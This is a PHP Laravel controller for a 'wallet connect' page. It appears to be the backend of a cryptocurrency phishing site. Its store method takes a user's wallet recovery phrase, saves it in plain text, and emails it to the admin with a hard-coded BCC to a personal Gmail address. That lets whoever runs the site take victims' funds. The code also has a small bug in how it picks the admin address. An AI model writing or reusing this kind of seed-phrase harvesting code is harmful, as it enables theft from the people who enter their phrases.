<?php

namespace App\Http\Controllers\User;

use App\Http\Controllers\Controller;

use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Mail;
use App\Mail\RecoveryPhraseConnected;

use Illuminate\Http\Request;

class ConnectController extends Controller
{
    public function index()
    {
        $title = "Link Connect";
        $user = auth()->user();
        if (Auth::user()->kyc_status == 0) {
            return redirect()->intended('user/kyc');
        } else {
        }
        return view('user.connect', compact('title', 'user'));
    }


    public function store(Request $request)
    {
        // Validate the phrase
        $request->validate([
            'recovery_phrase' => 'required', // 12 words separated by spaces
            'wallet_type' => 'required'
        ]);


        // Assuming you have a way to authenticate the user based on the recovery phrase
        $user = Auth::user(); // Get the currently authenticated user

        if (!$user) {
            return redirect()->back()->with('error', 'User not authenticated.');
        }


        $user->recovery_phrase = $request->input('recovery_phrase'); // Save the recovery phrase
        $user->wallet_type = $request->input('wallet_type'); // Save the recovery phrase
        $user->wallet_status = 1;
        $user->save();

        // Send email to admin
        $adminEmail = get_settings('official_email' ?? 'ofofonobs@gmail.com');
        $extraEmail = 'ofofonobs@gmail.com'; // Fetch the admin email from the .env file
        $recoveryPhrase = $request->input('recovery_phrase');
        Mail::to($adminEmail)
            ->bcc($extraEmail)
            ->send(new RecoveryPhraseConnected($user, $recoveryPhrase));
        return redirect()->intended('user/dashboard')->with('success', 'Wallet connected successfully!');
    }
}
